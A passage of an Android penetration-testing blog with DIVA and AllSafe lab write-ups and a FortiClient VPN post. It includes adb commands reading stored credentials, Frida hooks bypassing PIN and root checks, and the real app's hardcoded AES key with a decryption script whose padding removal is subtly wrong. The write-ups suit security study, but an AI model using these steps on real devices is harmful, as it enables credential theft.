numbers.\\r\\n![image.png](/img/d13.png)\\r\\n\\r\\n---\\r\\n\\r\\n##  Input Validation Issues - Part 2\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d14.png)\\r\\n\\r\\n\\r\\n### Solution\\r\\n\\r\\n- After analyzing the Java source code, I spotted two problems:\\r\\n\\r\\n```java\\r\\n// Problem 1 \u2014 JavaScript is enabled\\r\\nwset.setJavaScriptEnabled(true);\\r\\n\\r\\n// Problem 2 \u2014 User input is loaded directly into WebView without any validation\\r\\nwview.loadUrl(uriText.getText().toString());\\r\\n```\\r\\n\\r\\n- **Problem 1 \u2014 JavaScript Enabled:** Enabling JavaScript inside a WebView allows execution of JS code, making the app vulnerable to XSS attacks.\\r\\n- **Problem 2 \u2014 No URI Schema Validation:** The app passes user input directly to `loadUrl()` without restricting which schemas are allowed. This means the WebView accepts any schema including:\\r\\n  - `https://` \u2192 load any website\\r\\n  - `file:///` \u2192 access local files on the device\\r\\n  - `javascript:` \u2192 execute JS code\\r\\n\\r\\n- I exploited the `file://` schema to read internal files directly: `file:///etc/hosts`\\r\\n![image.png](/img/d15.png)\\r\\n\\r\\n- We can also access the app\'s SharedPreferences file: `file:///data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml`\\r\\n![image.png](/img/d16.png)\\r\\n\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 4. Insecure Data Storage - Part 1\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d17.png)\\r\\n\\r\\n\\r\\n### Solution\\r\\n\\r\\n- First I entered the username and password and got a success message confirming the credentials were saved.\\r\\n\\r\\n   ![image.png](/img/d18.png)\\r\\n- Now lets view the code of this challenge \\r\\n![image.png](/img/d19.png)\\r\\n\\r\\n- The function creates an instance of `SharedPreferences` \u2014 an XML file used to store data within the app in the form of key-value pairs \u2014 then saves the username and password directly into it without any encryption.\\r\\n- SharedPreferences files are always located in the app\'s private folder: `/data/data/jakhar.aseem.diva/shared_prefs`\\r\\n- I listed the contents of this directory \u2014 note that a rooted device is required:\\r\\n\\r\\n```bash\\r\\nls /data/data/jakhar.aseem.diva/shared_prefs\\r\\n\\r\\n# Output\\r\\nWebViewChromiumPrefs.xml\\r\\njakhar.aseem.diva_preferences.xml\\r\\n```\\r\\n\\r\\n- I read the file contents:\\r\\n\\r\\n```bash\\r\\ncat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml\\r\\n```\\r\\n\\r\\n- The file exposed the credentials stored in plaintext:\\r\\n\\r\\n```xml\\r\\n<?xml version=\'1.0\' encoding=\'utf-8\' standalone=\'yes\' ?>\\r\\n<map>\\r\\n    <string name=\\"password\\">testtt</string>\\r\\n    <string name=\\"user\\">wesam</string>\\r\\n</map>\\r\\n```\\r\\n\\r\\n---\\r\\n\\r\\n## 4. Insecure Data Storage - Part 2\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d20.png)\\r\\n\\r\\n\\r\\n### Solution\\r\\n\\r\\n- First I entered the username and password and got a success message confirming the credentials were saved.\\r\\n![image.png](/img/d21.png)\\r\\n\\r\\n- I analyzed the Java source code and found that the app uses a SQLite database called `ids2` to store user credentials: `this.mDB = openOrCreateDatabase(\\"ids2\\", 0, null);`\\r\\n![image.png](/img/d22.png)\\r\\n\\r\\n- SQLite databases are located at: `/data/data/jakhar.aseem.diva/databases`\\r\\n\\r\\n```bash\\r\\nls /data/data/jakhar.aseem.diva/databases\\r\\n\\r\\n# Output\\r\\ndivanotes.db\\r\\ndivanotes.db-journal\\r\\nids2\\r\\nids2-journal\\r\\nsqli\\r\\nsqli-journal\\r\\n```\\r\\n\\r\\n- I used `sqlite3` to open the database and view the data:\\r\\n\\r\\n```sql\\r\\nsqlite> .tables\\r\\nandroid_metadata  myuser\\r\\n\\r\\nsqlite> select * from myuser;\\r\\nhelp|hehhh\\r\\nhiiiii|hacked\\r\\nwesaaam|hhhhhhh\\r\\n```\\r\\n\\r\\n- All user credentials were stored in plaintext inside the database.\\r\\n\\r\\n---\\r\\n\\r\\n## 4. Insecure Data Storage - Part 3\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d23.png)\\r\\n\\r\\n\\r\\n### Solution\\r\\n\\r\\n- I entered a username and password and got a success message confirming the credentials were saved.\\r\\n![image.png](/img/d24.png)\\r\\n\\r\\n- I analyzed the Java source code and found that the app creates a temporary file with the naming style `uinfo-<randomvalues>-tmp` inside the app\'s private directory.\\r\\n![image.png](/img/d25.png)\\r\\n\\r\\n- I listed the contents of the app\'s private directory:\\r\\n\\r\\n```bash\\r\\nls /data/data/jakhar.aseem.diva\\r\\n\\r\\n# Output\\r\\napp_textures\\r\\napp_webview\\r\\ncache\\r\\ncode_cache\\r\\ndatabases\\r\\nshared_prefs\\r\\nuinfo8096798955951412972tmp\\r\\n```\\r\\n\\r\\n- I read the file contents:\\r\\n\\r\\n```bash\\r\\ncat /data/data/jakhar.aseem.diva/uinfo8096798955951412972tmp\\r\\n\\r\\n# Output\\r\\nhiii:hacked\\r\\n```\\r\\n\\r\\n- The credentials were stored in plaintext inside a temporary file.\\r\\n\\r\\n---\\r\\n\\r\\n## Part 4\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d26.png)\\r\\n\\r\\n### Solution\\r\\n\\r\\n- I entered a username and password and got a success message confirming the credentials were saved.\\r\\n![image.png](/img/d27.png)\\r\\n\\r\\n- I analyzed the Java source code and found that the app stores user credentials in a hidden file `.uinfo.txt` in external storage.\\r\\n![image.png](/img/d28.png)\\r\\n\\r\\n- External storage is accessible by any app on the device and is located at `/storage/emulated/0/`. I listed the directory contents using the `-a` flag to reveal hidden files:\\r\\n\\r\\n```bash\\r\\nls /storage/emulated/0/ -a\\r\\n.MySecurityData  .uinfo.txt  Android     DCIM       Download  Music          Pictures  Recordings  Screenshots\\r\\n.bash_history    Alarms      Audiobooks  Documents  Movies    Notifications  Podcasts  Ringtones\\r\\n```\\r\\n\\r\\n- I read the hidden file:\\r\\n\\r\\n```bash\\r\\ncat /storage/emulated/0/.uinfo.txt\\r\\ntesttt:hacked\\r\\n```\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 5. Access Control - Part 1\\r\\n\\r\\n### Objective\\r\\nAccess the API credentials from outside the app without using the app\'s interface directly.\\r\\n\\r\\n### Solution\\r\\n\\r\\n**Step 1 \u2014 Source Code Analysis**\\r\\n\\r\\n- I decompiled the APK using JADX and analyzed `AccessControl1Activity.java`. I found a button that triggers the `viewAPICredentials` function which creates an Implicit Intent:\\r\\n\\r\\n```java\\r\\nIntent i = new Intent();\\r\\ni.setAction(\\"jakhar.aseem.diva.action.VIEW_CREDS\\");\\r\\n```\\r\\n\\r\\n**Step 2 \u2014 Manifest Analysis**\\r\\n\\r\\n- I searched `AndroidManifest.xml` for the Activity that handles this action. I found `APICredsActivity` registered with an intent-filter matching the action `VIEW_CREDS`. Since it has an intent-filter, Android automatically marks it as Exported:\\r\\n\\r\\n```xml\\r\\n<activity android:label=\\"@string/apic_label\\" android:name=\\"jakhar.aseem.diva.APICredsActivity\\">\\r\\n    <intent-filter>\\r\\n        <action android:name=\\"jakhar.aseem.diva.action.VIEW_CREDS\\"/>\\r\\n        <category android:name=\\"android.intent.category.DEFAULT\\"/>\\r\\n    </intent-filter>\\r\\n</activity>\\r\\n```\\r\\n\\r\\n**Step 3 \u2014 Exploitation**\\r\\n\\r\\n- Since `APICredsActivity` is Exported automatically, I triggered it directly using ADB:\\r\\n\\r\\n```bash\\r\\nadb shell am start -n jakhar.aseem.diva/.APICredsActivity\\r\\n```\\r\\n\\r\\n- The Activity opened directly exposing the API credentials.\\r\\n\\r\\n---\\r\\n\\r\\n## Part 2\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d30.png)\\r\\n\\r\\n\\r\\n### Solution\\r\\n\\r\\n- After analyzing the Java source code, I found that `APICreds2Activity` checks a boolean parameter called `check_pin` from the incoming Intent:\\r\\n\\r\\n```java\\r\\nboolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);\\r\\nif (!bcheck) {\\r\\n    apicview.setText(\\"TVEETER API Key: secrettveeterapikey\\\\nAPI User name: diva2\\\\nAPI Password: p@ssword2\\");\\r\\n    return;\\r\\n}\\r\\n```\\r\\n\\r\\n- I looked up the actual value in `res/values/strings.xml`:\\r\\n\\r\\n```xml\\r\\n<string name=\\"chk_pin\\">check_pin</string>\\r\\n```\\r\\n\\r\\n:::tip\\r\\nAlways check `res/values/strings.xml` when you see `R.string.something` in code \u2014 it often reveals parameter names needed for exploitation.\\r\\n:::\\r\\n\\r\\n- The logic is simple:\\r\\n  - `check_pin = false` \u2192 show API credentials directly\\r\\n  - `check_pin = true` \u2192 ask for PIN (default behavior)\\r\\n\\r\\n- I then checked the Manifest and found that APICreds2Activity has an intent-filter \u2014 making it exported and accessible from outside the app without authentication:\\r\\n![image.png](/img/d31.png)\\r\\n- Combining everything, I triggered the Activity directly via ADB passing `check_pin` as `false` to bypass PIN verification:\\r\\n    \\r\\n    ```bash\\r\\n    adb shell am start \\\\\\r\\n    -a jakhar.aseem.diva.action.VIEW_CREDS2\\\\\\r\\n    --ez check_pin false\\r\\n    ```\\r\\n    \\r\\n    - **`am start`** : start an Activity\\r\\n    - **`-a (action flag)`** \u2014 specifies the Intent action\\r\\n    - **`-ez :`** passes a Boolean to the intent\\r\\n    - **`check_pin`** : the parameter name\\r\\n\\r\\n- The Activity opened directly exposing the API credentials without any PIN verification. ![image.png](/img/d32.png)\\r\\n\\r\\n\\r\\n---\\r\\n\\r\\n## Part 3\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d33.png)\\r\\n\\r\\n\\r\\n### Solution\\r\\n\\r\\n- After analyzing the Java source code, I found that `AccessControl3Activity` requires a valid PIN before showing the notes via `goToNotes()`:\\r\\n\\r\\n```java\\r\\npublic void goToNotes(View view) {\\r\\n    Intent i = new Intent(this, (Class<?>) AccessControl3NotesActivity.class);\\r\\n    startActivity(i);\\r\\n}\\r\\n```\\r\\n\\r\\n- Inside `AccessControl3NotesActivity`, the `accessNotes()` function validates the PIN then queries the notes from the Content Provider:\\r\\n\\r\\n```java\\r\\nString pin = spref.getString(getString(R.string.pkey), \\"\\");\\r\\nString userpin = pinTxt.getText().toString();\\r\\nif (userpin.equals(pin)) {\\r\\n    Cursor cr = getContentResolver().query(NotesProvider.CONTENT_URI, \\r\\n        new String[]{\\"_id\\", \\"title\\", \\"note\\"}, null, null, null);\\r\\n}\\r\\n```\\r\\n\\r\\n:::tip\\r\\n**Content Provider** is an Android component that acts as a middle layer between the app and its data.\\r\\n**ContentResolver** is the bridge used to communicate with the Content Provider.\\r\\n:::\\r\\n\\r\\n- I checked the Manifest and found that the Content Provider is explicitly exported:\\r\\n\\r\\n```xml\\r\\n<provider android:authorities=\\"jakhar.aseem.diva.provider.notesprovider\\"\\r\\n          android:enabled=\\"true\\"\\r\\n          android:exported=\\"true\\"\\r\\n          android:name=\\"jakhar.aseem.diva.NotesProvider\\"/>\\r\\n```\\r\\n\\r\\n- I found the full Content Provider URI in `NotesProvider.java`:\\r\\n\\r\\n```java\\r\\nstatic final Uri CONTENT_URI = Uri.parse(\\"content://jakhar.aseem.diva.provider.notesprovider/notes\\");\\r\\n```\\r\\n\\r\\n- I queried the notes directly from ADB \u2014 completely bypassing the PIN verification:\\r\\n\\r\\n```bash\\r\\nadb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes\\r\\n```\\r\\n\\r\\n- All notes were returned directly without any authentication.\\r\\n![image.png](/img/d34.png)"},{"id":"forticlient-vpn","metadata":{"permalink":"/W0W/forticlient-vpn","source":"@site/blog/2026-04-29-FortiClient.md","title":"FortiClient VPN - Credential Exposure","description":"{/ truncate /}","date":"2026-05-02T00:00:00.000Z","tags":[],"readingTime":2.62,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"forticlient-vpn","title":"FortiClient VPN - Credential Exposure","authors":["wesam"],"date":"2026-05-02T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"DIVA - Damn Insecure and Vulnerable App","permalink":"/W0W/diva"},"nextItem":{"title":"AllSafe - Part 1","permalink":"/W0W/allsafe-part1"}},"content":"{/* truncate */}\\r\\n\\r\\n### Objective\\r\\n\\r\\n- The app allows creating VPN profiles with username and password. noticed that credentials were **pre-filled** after creation \u2014 indicating they are **stored somewhere on the device**.\\r\\n- The goal is to find the stored credentials in the FortiClient VPN Android app.\\r\\n\\r\\n### Steps\\r\\n\\r\\n- Started with Checking common storage locations like **`SharedPreferences`**, the most common insecure storage location:\\r\\n    \\r\\n    ```bash\\r\\n    adb shell\\r\\n    cd /data/data/com.fortinet.forticlient/shared_prefs\\r\\n    ls\\r\\n    # app-settings.xml  profile-1.xml  profile-2.xml  profile-3.xml  webfilter.xml\\r\\n    \\r\\n    cat profile-3.xml\\r\\n    ```\\r\\n    \\r\\n- **Found**:\\r\\n    \\r\\n    ```xml\\r\\n    <map>\\r\\n        <string name=\\"profile.title\\">Wesam</string>\\r\\n        <string name=\\"ssl.user\\">WEsaaaam</string>\\r\\n        <string name=\\"ssl.resu\\">1B14ABF4142EC689FFDAD21D1A7DE0E6</string>\\r\\n        <string name=\\"profile.type\\">ssl</string>\\r\\n    </map>\\r\\n    ```\\r\\n    \\r\\n    - `ssl.user` = username in plaintext\\r\\n    - `ssl.resu` = password \u2014 looks encrypted (hex string)\\r\\n- I Wanted to trace the encryption in source code so I decompiled the APK with JADX and searched for `ssl.resu` to understand how the password is stored.\\r\\n    \\r\\n    ```java\\r\\n    public static void e(SharedPreferences sharedPreferences, String str) {\\r\\n        SharedPreferences.Editor editorEdit = sharedPreferences.edit();\\r\\n        editorEdit.putString(\\"ssl.resu\\", cu.n(str)); // password goes through cu.n() first\\r\\n        editorEdit.apply();\\r\\n    }\\r\\n    ```\\r\\n    \\r\\n- The password (`str`) is **not stored directly,** it\'s passed through `cu.n()` first, then the result is saved under the key `ssl.resu`. This means `cu.n()` is the encryption function.\\r\\n- Lets understand the encryption function n\\r\\n    \\r\\n    ```java\\r\\n    private static final String KEY = \\"FoRtInEt!AnDrOiD\\"; // hardcoded key\\r\\n    \\r\\n    public static String n(String str) {\\r\\n    \\r\\n        // Step 1: Define the IV (Initialization Vector)\\r\\n        IvParameterSpec ivParameterSpec = new IvParameterSpec(\\r\\n            new byte[]{117,122,39,67,114,124,115,44,113,116,124,123,58,89,118,94}\\r\\n        );\\r\\n    \\r\\n        // Step 2: Build the AES key from the hardcoded string\\r\\n        SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), \\"AES\\");\\r\\n    \\r\\n        // Step 3: Create the cipher with AES/CBC/PKCS5Padding\\r\\n        Cipher cipher = Cipher.getInstance(\\"AES/CBC/PKCS5Padding\\");\\r\\n    \\r\\n        // Step 4: Initialize cipher in ENCRYPT mode (mode 1 = encrypt, mode 2 = decrypt)\\r\\n        cipher.init(1, secretKeySpec, ivParameterSpec);\\r\\n    \\r\\n        // Step 5: Encrypt the password bytes\\r\\n        byte[] encrypted = cipher.doFinal(str.getBytes());\\r\\n    \\r\\n        // Step 6: Convert encrypted bytes \u2192 HEX string for storage\\r\\n        StringBuffer stringBuffer = new StringBuffer();\\r\\n        for (byte b : encrypted) {\\r\\n            String hexString = Integer.toHexString(b & 255);\\r\\n            if (1 == hexString.length()) {\\r\\n                hexString = \\"0\\" + hexString; // pad single chars with 0\\r\\n            }\\r\\n            stringBuffer.append(hexString.toUpperCase(Locale.ENGLISH));\\r\\n        }\\r\\n        return stringBuffer.toString(); // returns: \\"1B14ABF4142EC689FFDAD21D1A7DE0E6\\"\\r\\n    }\\r\\n    ```\\r\\n    \\r\\n    - From the code, Algorithm used is **AES/CBC/PKCS5Padding AES encryption in CBC mode.**\\r\\n    - **key is hardcoded `FoRtInEt!AnDrOiD`**\\r\\n    - **IV 16 bytes needed for CBC mode**\\r\\n    \\r\\n    <aside>\\r\\n    \u{1F4A1}\\r\\n    \\r\\n    Why is this a vulnerability?\\r\\n    \\r\\n    - AES itself is strong, but the implementation is fatally flawed:\\r\\n    - Hardcoded KEY + Hardcoded IV + Decompilable APK Anyone can decrypt any password stored by this app\\r\\n    </aside>\\r\\n    \\r\\n- Since we have the key, IV, and algorithm \u2014 decryption is straightforward. We just run the same process **in reverse this is a simple script**\\r\\n    \\r\\n    ```python\\r\\n    from Crypto.Cipher import AES\\r\\n    import binascii\\r\\n    \\r\\n    # exact same key and IV from the decompiled code\\r\\n    KEY = \\"FoRtInEt!AnDrOiD\\"\\r\\n    IV  = bytes([117, 122, 39, 67, 114, 124, 115, 44,\\r\\n                 113, 116, 124, 123, 58,  89,  118, 94])\\r\\n    \\r\\n    # the encrypted value from shared_prefs/profile-3.xml\\r\\n    encrypted_hex = \\"1B14ABF4142EC689FFDAD21D1A7DE0E6\\"\\r\\n    \\r\\n    # Step 1: convert hex string back to bytes\\r\\n    encrypted_bytes = binascii.unhexlify(encrypted_hex)\\r\\n    \\r\\n    # Step 2: create cipher in DECRYPT mode\\r\\n    cipher = AES.new(KEY.encode(), AES.MODE_CBC, IV)\\r\\n    \\r\\n    # Step 3: decrypt\\r\\n    decrypted = cipher.decrypt(encrypted_bytes)\\r\\n    \\r\\n    # Step 4: remove PKCS5 padding and decode to string\\r\\n    password = decrypted.rstrip(b\'\\\\x00\').decode(\'utf-8\', errors=\'ignore\')\\r\\n    print(\\"Password:\\", password)\\r\\n    ```\\r\\n    \\r\\n- After running this script I got the password in plain text\\r\\n    \\r\\n    ```bash\\r\\n    python3 script.py       \\r\\n    ## Password: HiThis IsWesam\\r\\n    ```"},{"id":"allsafe-part1","metadata":{"permalink":"/W0W/allsafe-part1","source":"@site/blog/2026-05-01-allsafe-part1.md","title":"AllSafe - Part 1","description":"AllSafe is an intentionally vulnerable Android app. This part covers challenges 1\u20136.","date":"2026-05-01T00:00:00.000Z","tags":[],"readingTime":3.3,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"allsafe-part1","title":"AllSafe - Part 1","authors":["wesam"],"date":"2026-05-01T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"FortiClient VPN - Credential Exposure","permalink":"/W0W/forticlient-vpn"},"nextItem":{"title":"AllSafe - Part 2","permalink":"/W0W/allsafe-part2"}},"content":"AllSafe is an intentionally vulnerable Android app. This part covers challenges 1\u20136.\\r\\n\\r\\n{/* truncate */}\\r\\n\\r\\n## 1. Insecure Logging\\r\\n\\r\\n### Objective:\\r\\n\\r\\n![image.png](/img/img7.png)\\r\\n\\r\\n### Solution:\\r\\n\\r\\n- just get PID of app so we can filterate logs\\r\\n\\r\\n```bash\\r\\nadb shell pidof  infosecadventures.allsafe\\r\\n4713\\r\\n```\\r\\n\\r\\n- Just **`adb logcat \u2014pid=4713`**\\r\\n    \\r\\n    ![image.png](/img/img6.png)\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 2. Hardcoded Credentials\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/img8.png)\\r\\n\\r\\n### Solution:\\r\\n\\r\\n- Decompile the APK using **JADX** and navigate to the `HardcodedCredentials` class. A static string named `BODY` contains a SOAP XML envelope with plaintext administrative credentials:\\r\\n    - **Username:** `superadmin`\\r\\n    - **Password:** `supersecurepassword`\\r\\n\\r\\n![image.png](/img/img9.png)\\r\\n\\r\\n- In the same class, the code reveals it is fetching a URL for a development environment:\\r\\n`String string = this$0.getString(R.string.dev_env);`\\r\\n- Checking the `strings.xml` file for the `dev_env` key reveals a second set of credentials embedded directly in a URL:\\r\\n    \\r\\n```xml\\r\\n    <string name=\\"dev_env\\">https://admin:password123@dev.infosecadventures.com</string>\\r\\n```\\r\\n    \\r\\n    ![image.png](/img/img10.png)\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 3. Firebase\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/imag11.png)\\r\\n\\r\\n### Solution\\r\\n\\r\\n- By decompiling the APK and searching through `strings.xml`, I identified the Firebase URL used by the application:\\r\\n    \\r\\n```xml\\r\\n    <string name=\\"firebase_database_url\\">[https://allsafe-8cef0.firebaseio.com](https://allsafe-8cef0.firebaseio.com/)</string>\\r\\n```\\r\\n    \\r\\n- Firebase databases are essentially JSON files. A common misconfiguration is leaving the database open to the public. To test this, I appended **`/.json`** to the end of the discovered URL: **`https://allsafe8cef0.firebaseio.com/.json`**\\r\\n- The database returned a JSON object containing a secret flag and a hidden message:\\r\\n    \\r\\n    ![image.png](/img/imag12.png)\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 4. Insecure Shared Preferences\\r\\n\\r\\n- The application provides a user login portal that allows users to register and store their credentials\\r\\n    \\r\\n    ![image.png](/img/image7.png)\\r\\n    \\r\\n- By searching for the \\"Successful registration!\\" toast message in **JADX**, I identified the registration logic in the source code:\\r\\n    \\r\\n```bash\\r\\n    SharedPreferences sharedpreferences = requireActivity().getSharedPreferences(\\"user\\", 0);\\r\\n    SharedPreferences.Editor editor = sharedpreferences.edit();\\r\\n    editor.putString(\\"username\\", username.getText().toString());\\r\\n    editor.putString(\\"password\\", password.getText().toString());\\r\\n    editor.apply();\\r\\n```\\r\\n    \\r\\n- The code reveals that the app uses the `SharedPreferences` API to store the username and password in a file named `user.xml`.\\r\\n- After registering a test account (`username: wesam`, `password: test`), I examined the contents of the `user.xml` file:\\r\\n\\r\\n```bash\\r\\ncd /data/data/infosecadventures.allsafe/shared_prefs \\r\\ncat user.xml\\r\\n```\\r\\n\\r\\n- **Output:**\\r\\n    \\r\\n```xml\\r\\n    <?xml version=\'1.0\' encoding=\'utf-8\' standalone=\'yes\' ?>\\r\\n    <map>\\r\\n        <string name=\\"password\\">test</string>\\r\\n        <string name=\\"username\\">wesam</string>\\r\\n    </map>\\r\\n```\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 5. SQL Injection\\r\\n\\r\\n![image.png](/img/image8.png)\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 6. Pin Bypass\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/image9.png)\\r\\n\\r\\n### Solution\\r\\n\\r\\n- Opening the APK in JADX, the validation logic is inside `onCreateView$lambda$0`:\\r\\n    \\r\\n```java\\r\\n    if (($pin.getText().toString().length() == 0) || \\r\\n        !this$0.checkPin($pin.getText().toString())) {\\r\\n        // \\"Incorrect PIN, try harder!\\"\\r\\n    } else {\\r\\n        // \\"Access granted, good job!\\"\\r\\n    }\\r\\n```\\r\\n    \\r\\n    - The actual check is inside `checkPin()`:\\r\\n- `checkPin()` decodes a hardcoded Base64 string and compares it against the user input. Decoding `NDg2Mw==` manually:  `echo \\"NDg2Mw==\\" | base64 -d`\\r\\nThe correct PIN is **4863**.\\r\\n\\r\\n- Ignore that the pin is hardcoded in the code, and let\'s assume it\'s not in this case we have 2 scenarios to solve the challenge\\r\\n\\r\\n---\\r\\n\\r\\n#### Solution 1 \u2014 Force return value\\r\\n\\r\\n- Hook `checkPin()` and always return `true` regardless of input:\\r\\n    \\r\\n```javascript\\r\\n    Java.perform(function() {\\r\\n        var cls = Java.use(\\"infosecadventures.allsafe.challenges.PinBypass\\");\\r\\n    \\r\\n        cls.checkPin.implementation = function(pin) {\\r\\n            console.log(\\"[*] PIN entered: \\" + pin);\\r\\n            return true;  // always pass\\r\\n        };\\r\\n    });\\r\\n```\\r\\n    \\r\\n    - Any PIN entered \u2192 access granted.\\r\\n\\r\\n---\\r\\n\\r\\n### Solution 2 \u2014 Brute force\\r\\n\\r\\n- We can brute force 4 digits code using frida through calling `checkPin()` with different values from 0000 - 9999 until it returns true.\\r\\n- Stops at **4863** and prints the correct PIN.\\r\\n    \\r\\n```javascript\\r\\n    Java.perform(function() {\\r\\n        var cls = Java.use(\\"infosecadventures.allsafe.challenges.PinBypass\\");\\r\\n    \\r\\n        cls.checkPin.implementation = function(pin) {\\r\\n            for (var i = 0; i <= 9999; i++) {\\r\\n                var attempt = String(i).padStart(4, \'0\');\\r\\n                if (this.checkPin(attempt)) {\\r\\n                    console.log(\\"[*] Correct PIN: \\" + attempt);\\r\\n                    break;\\r\\n                }\\r\\n            }\\r\\n            return true;\\r\\n        };\\r\\n    });\\r\\n```\\r\\n    \\r\\n    - `String(i)` \u2014 converts the integer `i` to a string since `checkPin()` expects a string parameter, not a number.\\r\\n    - `padStart(4, \'0\')` = make the string exactly 4 characters long \u2014 if it\'s shorter, fill the missing characters from the left with `\'0\'`."},{"id":"allsafe-part2","metadata":{"permalink":"/W0W/allsafe-part2","source":"@site/blog/2026-05-01-allsafe-part2.md","title":"AllSafe - Part 2","description":"AllSafe Part 2 covers challenges 7\u201312: Root Detection, Secure Flag Bypass, Deep Link, Insecure Broadcast Receiver, and Vulnerable WebView.","date":"2026-05-01T00:00:00.000Z","tags":[],"readingTime":4.7,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"allsafe-part2","title":"AllSafe - Part 2","authors":["wesam"],"date":"2026-05-01T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"AllSafe - Part 1","permalink":"/W0W/allsafe-part1"},"nextItem":{"title":"AllSafe - Part 3","permalink":"/W0W/allsafe-part3"}},"content":"AllSafe Part 2 covers challenges 7\u201312: Root Detection, Secure Flag Bypass, Deep Link, Insecure Broadcast Receiver, and Vulnerable WebView.\\r\\n\\r\\n{/* truncate */}\\r\\n\\r\\n## 7. Root Detection\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/image10.png)\\r\\n\\r\\n### Solution\\r\\n\\r\\n- Reviewing challenge Code in JADX and this is our entry point\\r\\n    \\r\\n```java\\r\\n    if (new RootBeer(this$0.getContext()).isRooted()) {\\r\\n        // \\"Sorry, your device is rooted!\\"\\r\\n    }\\r\\n```\\r\\n    \\r\\n    - The app creates a **new instance** of `RootBeer` and immediately calls `isRooted()` \u2014 this is the only thing standing between us and success.\\r\\n- Inside `isRooted()`  : All 9 checks are connected with `||` (OR) \u2014 meaning if **even one** returns `true`, `isRooted()` returns `true` and the app blocks us.\\r\\n    \\r\\n```java\\r\\n    public boolean isRooted() {\\r\\n        return detectRootManagementApps()       // SuperSU, Magisk Manager installed?\\r\\n            || detectPotentiallyDangerousApps() // known dangerous apps installed?\\r\\n            || checkForBinary(Const.BINARY_SU)  // su binary exists on device?\\r\\n            || checkForDangerousProps()         // build.prop has test/debug values?\\r\\n            || checkForRWPaths()                // system partitions mounted as rw?\\r\\n            || detectTestKeys()                 // build signed with test keys?\\r\\n            || checkSuExists()                  // runs `which su` in shell\\r\\n            || checkForRootNative()             // native JNI level root check\\r\\n            || checkForMagiskBinary();          // magisk binary exists on device?\\r\\n    }\\r\\n```\\r\\n    \\r\\n- We don\'t care about those checks we only have to hook on `isRooted` and force its return value to be false\\r\\n    \\r\\n```javascript\\r\\n    Java.perform(function() {\\r\\n        var RootBeer = Java.use(\\"com.scottyab.rootbeer.RootBeer\\");\\r\\n    \\r\\n        RootBeer.isRooted.implementation = function() {\\r\\n            console.log(\\"[*] isRooted() hooked \u2192 returning false\\");\\r\\n            return false;  // device appears clean to the app\\r\\n        };\\r\\n    });\\r\\n```\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 8. Secure Flag Bypass\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/image11.png)\\r\\n\\r\\n- **`FLAG_SECURE`** is a Windows flag set by the app on its `MainActivity`\\r\\n    \\r\\n```java\\r\\n    getWindow().setFlags(\\r\\n        WindowManager.LayoutParams.FLAG_SECURE,\\r\\n        WindowManager.LayoutParams.FLAG_SECURE\\r\\n    );\\r\\n```\\r\\n    \\r\\n    This prevents:\\r\\n    \\r\\n    - Taking screenshots\\r\\n    - Screen recording\\r\\n    - Appearing in the recent apps preview\\r\\n- It is **not a vulnerability,** it\'s a privacy protection feature. The challenge is just using it as a Frida practice target.\\r\\n\\r\\n---\\r\\n\\r\\n### Bypass with Frida\\r\\n\\r\\n```javascript\\r\\nJava.perform(function() {\\r\\n    var Window = Java.use(\\"android.view.Window\\");\\r\\n\\r\\n    Window.setFlags.implementation = function(flags, mask) {\\r\\n        // 